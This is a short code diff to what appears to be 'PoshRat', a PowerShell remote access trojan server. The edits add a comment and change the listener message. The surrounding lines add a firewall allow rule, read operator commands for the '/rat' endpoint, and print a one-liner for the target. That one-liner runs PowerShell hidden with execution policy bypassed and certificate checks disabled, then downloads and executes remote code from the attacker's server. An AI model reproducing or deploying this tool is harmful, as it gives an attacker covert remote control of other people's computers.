@@ -140,6 +140,7 @@ do
     if ($SSLUrl -eq '/rat' -and ($SSLMethod-eq "GET")) {  
 	
     $Command = Read-Host "PS $RemoteAddr>"
+    #If the Server/Attacker uses the exit command. Close the client part and the server.
     if ($Command -eq "exit")
     {
         $SSLResponse += "$Command"
@@ -169,7 +170,7 @@ do
     netsh advfirewall firewall add rule name="PoshRat Server $Port" dir=in action=allow protocol=TCP localport=$Port | Out-Null
 
     $listener.Start()
-    Write-Output "Listening on $Port"
+    Write-Output "Listening on $IPAddress`:$Port"
     Write-Output "Run the following command on the target:"
     Write-Output "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};iex ((New-Object Net.WebClient).DownloadString('https://$IPAddress`:$Port/connect'))"
 
